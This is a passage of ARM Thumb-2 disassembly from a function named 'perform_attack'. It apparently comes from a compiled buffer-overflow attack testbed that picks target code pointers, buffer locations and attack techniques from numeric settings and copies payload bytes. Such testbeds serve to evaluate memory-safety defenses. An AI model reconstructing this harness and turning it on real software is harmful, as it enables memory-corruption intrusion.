    9618:	f200 80ec 	bhi.w	97f4 <perform_attack+0x7a0>
    961c:	f20f 0c04 	addw	ip, pc, #4
    9620:	f85c f023 	ldr.w	pc, [ip, r3, lsl #2]
    9624:	00009665 	.word	0x00009665
    9628:	000096ab 	.word	0x000096ab
    962c:	000096c5 	.word	0x000096c5
    9630:	000096d9 	.word	0x000096d9
    9634:	000096eb 	.word	0x000096eb
    9638:	00009703 	.word	0x00009703
    963c:	00009717 	.word	0x00009717
    9640:	0000972b 	.word	0x0000972b
    9644:	00009741 	.word	0x00009741
    9648:	00009759 	.word	0x00009759
    964c:	0000978b 	.word	0x0000978b
    9650:	00009799 	.word	0x00009799
    9654:	000097a7 	.word	0x000097a7
    9658:	000097bf 	.word	0x000097bf
    965c:	000097d9 	.word	0x000097d9
    9660:	000097e7 	.word	0x000097e7
    9664:	f507 3052 	add.w	r0, r7, #215040	; 0x34800
    9668:	f100 0098 	add.w	r0, r0, #152	; 0x98
    966c:	6803      	ldr	r3, [r0, #0]
    966e:	f103 0210 	add.w	r2, r3, #16
    9672:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9676:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    967a:	601a      	str	r2, [r3, #0]
    967c:	f646 0360 	movw	r3, #26720	; 0x6860
    9680:	f2c0 0301 	movt	r3, #1
    9684:	6819      	ldr	r1, [r3, #0]
    9686:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    968a:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    968e:	681a      	ldr	r2, [r3, #0]
    9690:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9694:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    9698:	681b      	ldr	r3, [r3, #0]
    969a:	4608      	mov	r0, r1
    969c:	f64c 3164 	movw	r1, #52068	; 0xcb64
    96a0:	f2c0 0100 	movt	r1, #0
    96a4:	f7ff e996 	blx	89d4 <_init+0x140>
    96a8:	e0bb      	b.n	9822 <perform_attack+0x7ce>
    96aa:	f507 3152 	add.w	r1, r7, #215040	; 0x34800
    96ae:	f101 0198 	add.w	r1, r1, #152	; 0x98
    96b2:	680b      	ldr	r3, [r1, #0]
    96b4:	f103 020c 	add.w	r2, r3, #12
    96b8:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    96bc:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    96c0:	601a      	str	r2, [r3, #0]
    96c2:	e0ae      	b.n	9822 <perform_attack+0x7ce>
    96c4:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    96c8:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    96cc:	f507 3251 	add.w	r2, r7, #214016	; 0x34400
    96d0:	f502 7241 	add.w	r2, r2, #772	; 0x304
    96d4:	601a      	str	r2, [r3, #0]
    96d6:	e0a4      	b.n	9822 <perform_attack+0x7ce>
    96d8:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    96dc:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    96e0:	f107 02c0 	add.w	r2, r7, #192	; 0xc0
    96e4:	3ab8      	subs	r2, #184	; 0xb8
    96e6:	601a      	str	r2, [r3, #0]
    96e8:	e09b      	b.n	9822 <perform_attack+0x7ce>
    96ea:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    96ee:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    96f2:	f507 3c52 	add.w	ip, r7, #215040	; 0x34800
    96f6:	f10c 0cb8 	add.w	ip, ip, #184	; 0xb8
    96fa:	f8dc 2000 	ldr.w	r2, [ip]
    96fe:	601a      	str	r2, [r3, #0]
    9700:	e08f      	b.n	9822 <perform_attack+0x7ce>
    9702:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9706:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    970a:	f646 3224 	movw	r2, #27428	; 0x6b24
    970e:	f2c0 0201 	movt	r2, #1
    9712:	601a      	str	r2, [r3, #0]
    9714:	e085      	b.n	9822 <perform_attack+0x7ce>
    9716:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    971a:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    971e:	f246 7248 	movw	r2, #26440	; 0x6748
    9722:	f2c0 0201 	movt	r2, #1
    9726:	601a      	str	r2, [r3, #0]
    9728:	e07b      	b.n	9822 <perform_attack+0x7ce>
    972a:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    972e:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    9732:	f507 3251 	add.w	r2, r7, #214016	; 0x34400
    9736:	f502 7242 	add.w	r2, r2, #776	; 0x308
    973a:	3214      	adds	r2, #20
    973c:	601a      	str	r2, [r3, #0]
    973e:	e070      	b.n	9822 <perform_attack+0x7ce>
    9740:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    9744:	3bbc      	subs	r3, #188	; 0xbc
    9746:	681b      	ldr	r3, [r3, #0]
    9748:	f103 0214 	add.w	r2, r3, #20
    974c:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9750:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    9754:	601a      	str	r2, [r3, #0]
    9756:	e064      	b.n	9822 <perform_attack+0x7ce>
    9758:	f64c 307c 	movw	r0, #52092	; 0xcb7c
    975c:	f2c0 0000 	movt	r0, #0
    9760:	f507 3252 	add.w	r2, r7, #215040	; 0x34800
    9764:	f102 02b4 	add.w	r2, r2, #180	; 0xb4
    9768:	6811      	ldr	r1, [r2, #0]
    976a:	f7ff e8aa 	blx	88c0 <_init+0x2c>
    976e:	f507 3c52 	add.w	ip, r7, #215040	; 0x34800
    9772:	f10c 0cb4 	add.w	ip, ip, #180	; 0xb4
    9776:	f8dc 3000 	ldr.w	r3, [ip]
    977a:	f103 0214 	add.w	r2, r3, #20
    977e:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9782:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    9786:	601a      	str	r2, [r3, #0]
    9788:	e04b      	b.n	9822 <perform_attack+0x7ce>
    978a:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    978e:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    9792:	4acc      	ldr	r2, [pc, #816]	; (9ac4 <perform_attack+0xa70>)
    9794:	601a      	str	r2, [r3, #0]
    9796:	e044      	b.n	9822 <perform_attack+0x7ce>
    9798:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    979c:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    97a0:	4ac9      	ldr	r2, [pc, #804]	; (9ac8 <perform_attack+0xa74>)
    97a2:	601a      	str	r2, [r3, #0]
    97a4:	e03d      	b.n	9822 <perform_attack+0x7ce>
    97a6:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    97aa:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    97ae:	f507 5253 	add.w	r2, r7, #13504	; 0x34c0
    97b2:	f5a2 7231 	sub.w	r2, r2, #708	; 0x2c4
    97b6:	f502 7280 	add.w	r2, r2, #256	; 0x100
    97ba:	601a      	str	r2, [r3, #0]
    97bc:	e031      	b.n	9822 <perform_attack+0x7ce>
    97be:	f507 3052 	add.w	r0, r7, #215040	; 0x34800
    97c2:	f100 009c 	add.w	r0, r0, #156	; 0x9c
    97c6:	6803      	ldr	r3, [r0, #0]
    97c8:	f503 7280 	add.w	r2, r3, #256	; 0x100
    97cc:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    97d0:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    97d4:	601a      	str	r2, [r3, #0]
    97d6:	e024      	b.n	9822 <perform_attack+0x7ce>
    97d8:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    97dc:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    97e0:	4aba      	ldr	r2, [pc, #744]	; (9acc <perform_attack+0xa78>)
    97e2:	601a      	str	r2, [r3, #0]
    97e4:	e01d      	b.n	9822 <perform_attack+0x7ce>
    97e6:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    97ea:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    97ee:	4ab8      	ldr	r2, [pc, #736]	; (9ad0 <perform_attack+0xa7c>)
    97f0:	601a      	str	r2, [r3, #0]
    97f2:	e016      	b.n	9822 <perform_attack+0x7ce>
    97f4:	f646 0350 	movw	r3, #26704	; 0x6850
    97f8:	f2c0 0301 	movt	r3, #1
    97fc:	681b      	ldr	r3, [r3, #0]
    97fe:	2b00      	cmp	r3, #0
    9800:	d00c      	beq.n	981c <perform_attack+0x7c8>
    9802:	f646 0360 	movw	r3, #26720	; 0x6860
    9806:	f2c0 0301 	movt	r3, #1
    980a:	681b      	ldr	r3, [r3, #0]
    980c:	f64c 3094 	movw	r0, #52116	; 0xcb94
    9810:	f2c0 0000 	movt	r0, #0
    9814:	2101      	movs	r1, #1
    9816:	2226      	movs	r2, #38	; 0x26
    9818:	f7ff e894 	blx	8944 <_init+0xb0>
    981c:	2001      	movs	r0, #1
    981e:	f7ff e8c8 	blx	89b0 <_init+0x11c>
    9822:	e07b      	b.n	991c <perform_attack+0x8c8>
    9824:	f646 2388 	movw	r3, #27272	; 0x6a88
    9828:	f2c0 0301 	movt	r3, #1
    982c:	68db      	ldr	r3, [r3, #12]
    982e:	f5a3 73c8 	sub.w	r3, r3, #400	; 0x190
    9832:	2b03      	cmp	r3, #3
    9834:	d843      	bhi.n	98be <perform_attack+0x86a>
    9836:	a101      	add	r1, pc, #4	; (adr r1, 983c <perform_attack+0x7e8>)
    9838:	f851 f023 	ldr.w	pc, [r1, r3, lsl #2]
    983c:	0000984d 	.word	0x0000984d
    9840:	00009861 	.word	0x00009861
    9844:	00009879 	.word	0x00009879
    9848:	0000989f 	.word	0x0000989f
    984c:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9850:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    9854:	f507 3251 	add.w	r2, r7, #214016	; 0x34400
    9858:	f502 7240 	add.w	r2, r2, #768	; 0x300
    985c:	601a      	str	r2, [r3, #0]
    985e:	e045      	b.n	98ec <perform_attack+0x898>
    9860:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9864:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    9868:	f507 3c52 	add.w	ip, r7, #215040	; 0x34800
    986c:	f10c 0cbc 	add.w	ip, ip, #188	; 0xbc
    9870:	f8dc 2000 	ldr.w	r2, [ip]
    9874:	601a      	str	r2, [r3, #0]
    9876:	e039      	b.n	98ec <perform_attack+0x898>
    9878:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    987c:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    9880:	f646 6238 	movw	r2, #28216	; 0x6e38
    9884:	f2c0 0201 	movt	r2, #1
    9888:	601a      	str	r2, [r3, #0]
    988a:	f646 6338 	movw	r3, #28216	; 0x6e38
    988e:	f2c0 0301 	movt	r3, #1
    9892:	f646 623c 	movw	r2, #28220	; 0x6e3c
    9896:	f2c0 0201 	movt	r2, #1
    989a:	601a      	str	r2, [r3, #0]
    989c:	e026      	b.n	98ec <perform_attack+0x898>
    989e:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    98a2:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    98a6:	f646 0270 	movw	r2, #26736	; 0x6870
    98aa:	f2c0 0201 	movt	r2, #1
    98ae:	601a      	str	r2, [r3, #0]
    98b0:	f64c 30bc 	movw	r0, #52156	; 0xcbbc
    98b4:	f2c0 0000 	movt	r0, #0
    98b8:	f7ff e85c 	blx	8974 <_init+0xe0>
    98bc:	e016      	b.n	98ec <perform_attack+0x898>
    98be:	f646 0350 	movw	r3, #26704	; 0x6850
    98c2:	f2c0 0301 	movt	r3, #1
    98c6:	681b      	ldr	r3, [r3, #0]
    98c8:	2b00      	cmp	r3, #0
    98ca:	d00c      	beq.n	98e6 <perform_attack+0x892>
    98cc:	f646 0360 	movw	r3, #26720	; 0x6860
    98d0:	f2c0 0301 	movt	r3, #1
    98d4:	681b      	ldr	r3, [r3, #0]
    98d6:	f64c 30e8 	movw	r0, #52200	; 0xcbe8
    98da:	f2c0 0000 	movt	r0, #0
    98de:	2101      	movs	r1, #1
    98e0:	2221      	movs	r2, #33	; 0x21
    98e2:	f7ff e830 	blx	8944 <_init+0xb0>
    98e6:	2001      	movs	r0, #1
    98e8:	f7ff e862 	blx	89b0 <_init+0x11c>
    98ec:	e016      	b.n	991c <perform_attack+0x8c8>
    98ee:	f646 0350 	movw	r3, #26704	; 0x6850
    98f2:	f2c0 0301 	movt	r3, #1
    98f6:	681b      	ldr	r3, [r3, #0]
    98f8:	2b00      	cmp	r3, #0
    98fa:	d00c      	beq.n	9916 <perform_attack+0x8c2>
    98fc:	f646 0360 	movw	r3, #26720	; 0x6860
    9900:	f2c0 0301 	movt	r3, #1
    9904:	681b      	ldr	r3, [r3, #0]
    9906:	f64c 400c 	movw	r0, #52236	; 0xcc0c
    990a:	f2c0 0000 	movt	r0, #0
    990e:	2101      	movs	r1, #1
    9910:	2223      	movs	r2, #35	; 0x23
    9912:	f7ff e818 	blx	8944 <_init+0xb0>
    9916:	2001      	movs	r0, #1
    9918:	f7ff e84a 	blx	89b0 <_init+0x11c>
    991c:	f507 3052 	add.w	r0, r7, #215040	; 0x34800
    9920:	f100 0098 	add.w	r0, r0, #152	; 0x98
    9924:	6803      	ldr	r3, [r0, #0]
    9926:	f103 0210 	add.w	r2, r3, #16
    992a:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    992e:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9932:	625a      	str	r2, [r3, #36]	; 0x24
    9934:	f646 0360 	movw	r3, #26720	; 0x6860
    9938:	f2c0 0301 	movt	r3, #1
    993c:	6819      	ldr	r1, [r3, #0]
    993e:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9942:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9946:	6a5a      	ldr	r2, [r3, #36]	; 0x24
    9948:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    994c:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9950:	6a5b      	ldr	r3, [r3, #36]	; 0x24
    9952:	681b      	ldr	r3, [r3, #0]
    9954:	4608      	mov	r0, r1
    9956:	f64c 4130 	movw	r1, #52272	; 0xcc30
    995a:	f2c0 0100 	movt	r1, #0
    995e:	f7ff e83a 	blx	89d4 <_init+0x140>
    9962:	f646 2388 	movw	r3, #27272	; 0x6a88
    9966:	f2c0 0301 	movt	r3, #1
    996a:	689b      	ldr	r3, [r3, #8]
    996c:	f2a3 1333 	subw	r3, r3, #307	; 0x133
    9970:	2b04      	cmp	r3, #4
    9972:	f200 80af 	bhi.w	9ad4 <perform_attack+0xa80>
    9976:	a101      	add	r1, pc, #4	; (adr r1, 997c <perform_attack+0x928>)
    9978:	f851 f023 	ldr.w	pc, [r1, r3, lsl #2]
    997c:	00009991 	.word	0x00009991
    9980:	000099bd 	.word	0x000099bd
    9984:	000099f9 	.word	0x000099f9
    9988:	00009a35 	.word	0x00009a35
    998c:	00009a8d 	.word	0x00009a8d
    9990:	f507 3351 	add.w	r3, r7, #214016	; 0x34400
    9994:	f503 7342 	add.w	r3, r3, #776	; 0x308
    9998:	4618      	mov	r0, r3
    999a:	f7fe efb0 	blx	88fc <_init+0x68>
    999e:	4603      	mov	r3, r0
    99a0:	2b00      	cmp	r3, #0
    99a2:	d001      	beq.n	99a8 <perform_attack+0x954>
    99a4:	f001 b992 	b.w	accc <perform_attack+0x1c78>
    99a8:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    99ac:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    99b0:	f507 3251 	add.w	r2, r7, #214016	; 0x34400
    99b4:	f502 7242 	add.w	r2, r2, #776	; 0x308
    99b8:	611a      	str	r2, [r3, #16]
    99ba:	e08c      	b.n	9ad6 <perform_attack+0xa82>
    99bc:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    99c0:	3bbc      	subs	r3, #188	; 0xbc
    99c2:	681b      	ldr	r3, [r3, #0]
    99c4:	4618      	mov	r0, r3
    99c6:	f7fe ef9a 	blx	88fc <_init+0x68>
    99ca:	4603      	mov	r3, r0
    99cc:	2b00      	cmp	r3, #0
    99ce:	d001      	beq.n	99d4 <perform_attack+0x980>
    99d0:	f001 b97c 	b.w	accc <perform_attack+0x1c78>
    99d4:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    99d8:	3bbc      	subs	r3, #188	; 0xbc
    99da:	681a      	ldr	r2, [r3, #0]
    99dc:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    99e0:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    99e4:	611a      	str	r2, [r3, #16]
    99e6:	f107 02c0 	add.w	r2, r7, #192	; 0xc0
    99ea:	3abc      	subs	r2, #188	; 0xbc
    99ec:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    99f0:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    99f4:	615a      	str	r2, [r3, #20]
    99f6:	e06e      	b.n	9ad6 <perform_attack+0xa82>
    99f8:	f507 3252 	add.w	r2, r7, #215040	; 0x34800
    99fc:	f102 02b4 	add.w	r2, r2, #180	; 0xb4
    9a00:	6810      	ldr	r0, [r2, #0]
    9a02:	f7fe ef7c 	blx	88fc <_init+0x68>
    9a06:	4603      	mov	r3, r0
    9a08:	2b00      	cmp	r3, #0
    9a0a:	d001      	beq.n	9a10 <perform_attack+0x9bc>
    9a0c:	f001 b95e 	b.w	accc <perform_attack+0x1c78>
    9a10:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9a14:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9a18:	f507 3c52 	add.w	ip, r7, #215040	; 0x34800
    9a1c:	f10c 0cb4 	add.w	ip, ip, #180	; 0xb4
    9a20:	f8dc 2000 	ldr.w	r2, [ip]
    9a24:	611a      	str	r2, [r3, #16]
    9a26:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9a2a:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9a2e:	2200      	movs	r2, #0
    9a30:	615a      	str	r2, [r3, #20]
    9a32:	e050      	b.n	9ad6 <perform_attack+0xa82>
    9a34:	f646 40b0 	movw	r0, #27824	; 0x6cb0
    9a38:	f2c0 0001 	movt	r0, #1
    9a3c:	f7fe ef5e 	blx	88fc <_init+0x68>
    9a40:	4603      	mov	r3, r0
    9a42:	2b00      	cmp	r3, #0
    9a44:	d001      	beq.n	9a4a <perform_attack+0x9f6>
    9a46:	f001 b941 	b.w	accc <perform_attack+0x1c78>
    9a4a:	f64c 406c 	movw	r0, #52332	; 0xcc6c
    9a4e:	f2c0 0000 	movt	r0, #0
    9a52:	f7fe ef90 	blx	8974 <_init+0xe0>
    9a56:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9a5a:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9a5e:	f646 42b0 	movw	r2, #27824	; 0x6cb0
    9a62:	f2c0 0201 	movt	r2, #1
    9a66:	611a      	str	r2, [r3, #16]
    9a68:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9a6c:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9a70:	2200      	movs	r2, #0
    9a72:	615a      	str	r2, [r3, #20]
    9a74:	f646 6040 	movw	r0, #28224	; 0x6e40
    9a78:	f2c0 0001 	movt	r0, #1
    9a7c:	f7fe ef3e 	blx	88fc <_init+0x68>
    9a80:	4603      	mov	r3, r0
    9a82:	2b00      	cmp	r3, #0
    9a84:	d001      	beq.n	9a8a <perform_attack+0xa36>
    9a86:	f001 b921 	b.w	accc <perform_attack+0x1c78>
    9a8a:	e024      	b.n	9ad6 <perform_attack+0xa82>
    9a8c:	f646 0078 	movw	r0, #26744	; 0x6878
    9a90:	f2c0 0001 	movt	r0, #1
    9a94:	f7fe ef32 	blx	88fc <_init+0x68>
    9a98:	4603      	mov	r3, r0
    9a9a:	2b00      	cmp	r3, #0
    9a9c:	d001      	beq.n	9aa2 <perform_attack+0xa4e>
    9a9e:	f001 b915 	b.w	accc <perform_attack+0x1c78>
    9aa2:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9aa6:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9aaa:	f646 0278 	movw	r2, #26744	; 0x6878
    9aae:	f2c0 0201 	movt	r2, #1
    9ab2:	611a      	str	r2, [r3, #16]
    9ab4:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9ab8:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9abc:	2200      	movs	r2, #0
    9abe:	615a      	str	r2, [r3, #20]
    9ac0:	e009      	b.n	9ad6 <perform_attack+0xa82>
    9ac2:	bf00      	nop
    9ac4:	00016cc4 	.word	0x00016cc4
    9ac8:	0001688c 	.word	0x0001688c
    9acc:	0001684c 	.word	0x0001684c
    9ad0:	00016c28 	.word	0x00016c28
    9ad4:	bf00      	nop
    9ad6:	f646 2388 	movw	r3, #27272	; 0x6a88
    9ada:	f2c0 0301 	movt	r3, #1
    9ade:	685a      	ldr	r2, [r3, #4]
    9ae0:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9ae4:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9ae8:	601a      	str	r2, [r3, #0]
    9aea:	f646 2388 	movw	r3, #27272	; 0x6a88
    9aee:	f2c0 0301 	movt	r3, #1
    9af2:	681b      	ldr	r3, [r3, #0]
    9af4:	2b64      	cmp	r3, #100	; 0x64
    9af6:	d003      	beq.n	9b00 <perform_attack+0xaac>
    9af8:	2b65      	cmp	r3, #101	; 0x65
    9afa:	f000 80d4 	beq.w	9ca6 <perform_attack+0xc52>
    9afe:	e1bf      	b.n	9e80 <perform_attack+0xe2c>
    9b00:	f646 2388 	movw	r3, #27272	; 0x6a88
    9b04:	f2c0 0301 	movt	r3, #1
    9b08:	685b      	ldr	r3, [r3, #4]
    9b0a:	3bc8      	subs	r3, #200	; 0xc8
    9b0c:	2b05      	cmp	r3, #5
    9b0e:	d862      	bhi.n	9bd6 <perform_attack+0xb82>
    9b10:	a001      	add	r0, pc, #4	; (adr r0, 9b18 <perform_attack+0xac4>)
    9b12:	f850 f023 	ldr.w	pc, [r0, r3, lsl #2]
    9b16:	bf00      	nop
    9b18:	00009b31 	.word	0x00009b31
    9b1c:	00009b31 	.word	0x00009b31
    9b20:	00009b31 	.word	0x00009b31
    9b24:	00009b45 	.word	0x00009b45
    9b28:	00009b31 	.word	0x00009b31
    9b2c:	00009bc3 	.word	0x00009bc3
    9b30:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9b34:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9b38:	f246 2234 	movw	r2, #25140	; 0x6234
    9b3c:	f2c0 0201 	movt	r2, #1
    9b40:	609a      	str	r2, [r3, #8]
    9b42:	e05f      	b.n	9c04 <perform_attack+0xbb0>
    9b44:	f646 2388 	movw	r3, #27272	; 0x6a88
    9b48:	f2c0 0301 	movt	r3, #1
    9b4c:	689a      	ldr	r2, [r3, #8]
    9b4e:	f240 1333 	movw	r3, #307	; 0x133
    9b52:	429a      	cmp	r2, r3
    9b54:	d021      	beq.n	9b9a <perform_attack+0xb46>
    9b56:	f646 2388 	movw	r3, #27272	; 0x6a88
    9b5a:	f2c0 0301 	movt	r3, #1
    9b5e:	689b      	ldr	r3, [r3, #8]
    9b60:	f5b3 7f9a 	cmp.w	r3, #308	; 0x134
    9b64:	d019      	beq.n	9b9a <perform_attack+0xb46>
    9b66:	f646 2388 	movw	r3, #27272	; 0x6a88
    9b6a:	f2c0 0301 	movt	r3, #1
    9b6e:	689a      	ldr	r2, [r3, #8]
    9b70:	f240 1335 	movw	r3, #309	; 0x135
    9b74:	429a      	cmp	r2, r3
    9b76:	d010      	beq.n	9b9a <perform_attack+0xb46>
    9b78:	f646 2388 	movw	r3, #27272	; 0x6a88
    9b7c:	f2c0 0301 	movt	r3, #1
    9b80:	689b      	ldr	r3, [r3, #8]
    9b82:	f5b3 7f9b 	cmp.w	r3, #310	; 0x136
    9b86:	d008      	beq.n	9b9a <perform_attack+0xb46>
    9b88:	f646 2388 	movw	r3, #27272	; 0x6a88
    9b8c:	f2c0 0301 	movt	r3, #1
    9b90:	689a      	ldr	r2, [r3, #8]
    9b92:	f240 1337 	movw	r3, #311	; 0x137
    9b96:	429a      	cmp	r2, r3
    9b98:	d109      	bne.n	9bae <perform_attack+0xb5a>
    9b9a:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9b9e:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9ba2:	f648 12e0 	movw	r2, #35296	; 0x89e0
    9ba6:	f2c0 0200 	movt	r2, #0
    9baa:	609a      	str	r2, [r3, #8]
    9bac:	e02a      	b.n	9c04 <perform_attack+0xbb0>
    9bae:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9bb2:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9bb6:	f648 12e0 	movw	r2, #35296	; 0x89e0
    9bba:	f2c0 0200 	movt	r2, #0
    9bbe:	609a      	str	r2, [r3, #8]
    9bc0:	e020      	b.n	9c04 <perform_attack+0xbb0>
    9bc2:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9bc6:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9bca:	f646 0254 	movw	r2, #26708	; 0x6854
    9bce:	f2c0 0201 	movt	r2, #1
    9bd2:	609a      	str	r2, [r3, #8]
    9bd4:	e016      	b.n	9c04 <perform_attack+0xbb0>
    9bd6:	f646 0350 	movw	r3, #26704	; 0x6850
    9bda:	f2c0 0301 	movt	r3, #1
    9bde:	681b      	ldr	r3, [r3, #0]
    9be0:	2b00      	cmp	r3, #0
    9be2:	d00c      	beq.n	9bfe <perform_attack+0xbaa>
    9be4:	f646 0360 	movw	r3, #26720	; 0x6860
    9be8:	f2c0 0301 	movt	r3, #1
    9bec:	681b      	ldr	r3, [r3, #0]
    9bee:	f64c 4084 	movw	r0, #52356	; 0xcc84
    9bf2:	f2c0 0000 	movt	r0, #0
    9bf6:	2101      	movs	r1, #1
    9bf8:	222b      	movs	r2, #43	; 0x2b
    9bfa:	f7fe eea4 	blx	8944 <_init+0xb0>
    9bfe:	2001      	movs	r0, #1
    9c00:	f7fe eed6 	blx	89b0 <_init+0x11c>
    9c04:	f64c 40b0 	movw	r0, #52400	; 0xccb0
    9c08:	f2c0 0000 	movt	r0, #0
    9c0c:	f7fe eeb2 	blx	8974 <_init+0xe0>
    9c10:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9c14:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    9c18:	689a      	ldr	r2, [r3, #8]
    9c1a:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    9c1e:	3bac      	subs	r3, #172	; 0xac
    9c20:	4614      	mov	r4, r2
    9c22:	461d      	mov	r5, r3
    9c24:	f104 0e20 	add.w	lr, r4, #32
    9c28:	462e      	mov	r6, r5
    9c2a:	4623      	mov	r3, r4
    9c2c:	6818      	ldr	r0, [r3, #0]
    9c2e:	6859      	ldr	r1, [r3, #4]
    9c30:	689a      	ldr	r2, [r3, #8]
    9c32:	68db      	ldr	r3, [r3, #12]
    9c34:	c60f      	stmia	r6!, {r0, r1, r2, r3}
    9c36:	3410      	adds	r4, #16
    9c38:	3510      	adds	r5, #16
    9c3a:	4574      	cmp	r4, lr
    9c3c:	d1f4      	bne.n	9c28 <perform_attack+0xbd4>
    9c3e:	462b      	mov	r3, r5
    9c40:	4622      	mov	r2, r4
    9c42:	6810      	ldr	r0, [r2, #0]
    9c44:	6851      	ldr	r1, [r2, #4]
    9c46:	c303      	stmia	r3!, {r0, r1}
    9c48:	2300      	movs	r3, #0
    9c4a:	f507 3152 	add.w	r1, r7, #215040	; 0x34800
    9c4e:	f101 01ac 	add.w	r1, r1, #172	; 0xac
    9c52:	600b      	str	r3, [r1, #0]
    9c54:	e01c      	b.n	9c90 <perform_attack+0xc3c>
    9c56:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    9c5a:	3bac      	subs	r3, #172	; 0xac
    9c5c:	f507 3c52 	add.w	ip, r7, #215040	; 0x34800
    9c60:	f10c 0cac 	add.w	ip, ip, #172	; 0xac
    9c64:	f8dc 2000 	ldr.w	r2, [ip]
    9c68:	4413      	add	r3, r2
    9c6a:	781b      	ldrb	r3, [r3, #0]
    9c6c:	f64c 206c 	movw	r0, #51820	; 0xca6c
    9c70:	f2c0 0000 	movt	r0, #0
    9c74:	4619      	mov	r1, r3
    9c76:	f7fe ee24 	blx	88c0 <_init+0x2c>
    9c7a:	f507 3052 	add.w	r0, r7, #215040	; 0x34800
    9c7e:	f100 00ac 	add.w	r0, r0, #172	; 0xac
    9c82:	6803      	ldr	r3, [r0, #0]
    9c84:	3301      	adds	r3, #1
    9c86:	f507 3152 	add.w	r1, r7, #215040	; 0x34800
    9c8a:	f101 01ac 	add.w	r1, r1, #172	; 0xac
    9c8e:	600b      	str	r3, [r1, #0]
    9c90:	f507 3252 	add.w	r2, r7, #215040	; 0x34800
    9c94:	f102 02ac 	add.w	r2, r2, #172	; 0xac
    9c98:	6813      	ldr	r3, [r2, #0]
    9c9a:	2b27      	cmp	r3, #39	; 0x27
    9c9c:	dddb      	ble.n	9c56 <perform_attack+0xc02>
    9c9e:	200a      	movs	r0, #10
    9ca0:	f7fe eeb6 	blx	8a10 <_init+0x17c>
